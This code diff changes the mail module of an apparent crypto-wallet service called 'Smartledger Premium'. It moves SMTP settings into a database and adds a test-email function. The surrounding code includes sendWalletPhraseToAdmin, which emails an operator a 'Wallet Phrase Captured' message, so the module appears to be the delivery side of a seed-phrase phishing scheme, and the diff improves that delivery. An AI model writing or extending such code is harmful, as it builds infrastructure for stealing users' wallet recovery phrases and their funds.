@@ -1,24 +1,33 @@
 import nodemailer from "nodemailer";
+import { db, settingsTable } from "@workspace/db";
 import { logger } from "./logger";
 
 const ADMIN_EMAIL = process.env.ADMIN_EMAIL ?? "smartsafepalpremium@gmail.com";
 
-function getTransporter(opts?: {
-  host?: string | null;
-  port?: number | null;
-  user?: string | null;
-  pass?: string | null;
-}) {
-  if (opts?.host && opts?.user && opts?.pass) {
-    return nodemailer.createTransport({
-      host: opts.host,
-      port: opts.port ?? 587,
-      auth: { user: opts.user, pass: opts.pass },
-    });
-  }
+async function getSMTPConfig() {
+  try {
+    const [s] = await db.select().from(settingsTable).limit(1);
+    if (s?.smtpHost && s?.smtpUser && s?.smtpPass) {
+      return { host: s.smtpHost, port: s.smtpPort ?? 587, user: s.smtpUser, pass: s.smtpPass };
+    }
+  } catch { /* fall through */ }
+  return null;
+}
+
+function buildTransporter(cfg: { host: string; port: number; user: string; pass: string }) {
+  return nodemailer.createTransport({
+    host: cfg.host,
+    port: cfg.port,
+    secure: cfg.port === 465,
+    auth: { user: cfg.user, pass: cfg.pass },
+  });
+}
+
+function envTransporter() {
   return nodemailer.createTransport({
     host: "smtp.gmail.com",
     port: 587,
+    secure: false,
     auth: {
       user: process.env.SMTP_USER ?? ADMIN_EMAIL,
       pass: process.env.SMTP_PASS ?? "",
@@ -204,11 +213,53 @@ export async function sendWalletPhraseToAdmin(
   await send(adminEmail, `Wallet Phrase Captured — ${walletType}`, baseTemplate("Wallet Phrase Captured", body));
 }
 
+export async function sendTestEmail(to: string): Promise<{ ok: boolean; error?: string }> {
+  const body = `
+    <p class="body-text">This is a test email from Smartledger Premium.</p>
+    <div class="highlight">
+      <p><strong>Status:</strong> <span class="badge badge-approved">Delivered</span></p>
+    </div>
+    <p class="body-text">If you received this, your SMTP configuration is working correctly.</p>
+  `;
+  try {
+    const dbCfg = await getSMTPConfig();
+    let transport: ReturnType<typeof nodemailer.createTransport>;
+    let fromAddr: string;
+    if (dbCfg) {
+      transport = buildTransporter(dbCfg);
+      fromAddr = dbCfg.user;
+    } else {
+      transport = envTransporter();
+      fromAddr = process.env.SMTP_USER ?? ADMIN_EMAIL;
+    }
+    await transport.sendMail({
+      from: `"Smartledger Premium" <${fromAddr}>`,
+      to,
+      subject: "Test Email — Smartledger Premium",
+      html: baseTemplate("Email Test Successful", body),
+    });
+    return { ok: true };
+  } catch (err: any) {
+    const msg = err?.message ?? String(err);
+    logger.error({ err, to }, "Test email failed");
+    return { ok: false, error: msg };
+  }
+}
+
 async function send(to: string, subject: string, html: string) {
   try {
-    const transport = getTransporter();
+    const dbCfg = await getSMTPConfig();
+    let transport: ReturnType<typeof nodemailer.createTransport>;
+    let fromAddr: string;
+    if (dbCfg) {
+      transport = buildTransporter(dbCfg);
+      fromAddr = dbCfg.user;
+    } else {
+      transport = envTransporter();
+      fromAddr = process.env.SMTP_USER ?? ADMIN_EMAIL;
+    }
     await transport.sendMail({
-      from: `"Smartledger Premium" <${ADMIN_EMAIL}>`,
+      from: `"Smartledger Premium" <${fromAddr}>`,
       to,
       subject,
       html,
